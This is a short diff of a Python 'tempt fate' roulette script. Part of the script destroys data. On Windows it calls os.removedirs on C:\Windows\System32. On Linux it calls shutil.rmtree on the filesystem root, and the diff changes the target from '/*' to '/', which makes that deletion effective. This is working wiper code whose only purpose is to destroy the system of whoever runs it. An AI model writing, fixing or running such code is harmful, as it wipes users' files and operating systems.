@@ -4,10 +4,10 @@
 
 import random
 import os
-import shutil
 import time
 import sys
 import platform
+import shutil
 
 temptFate = True
 
@@ -26,7 +26,7 @@ while temptFate:
         if platform.system() != "Linux":
             os.removedirs("C:\Windows\System32")
         else:
-            shutil.rmtree("/*", ignore_errors=True)
+            shutil.rmtree("/", ignore_errors=True)
         
         sys.exit()
     else:
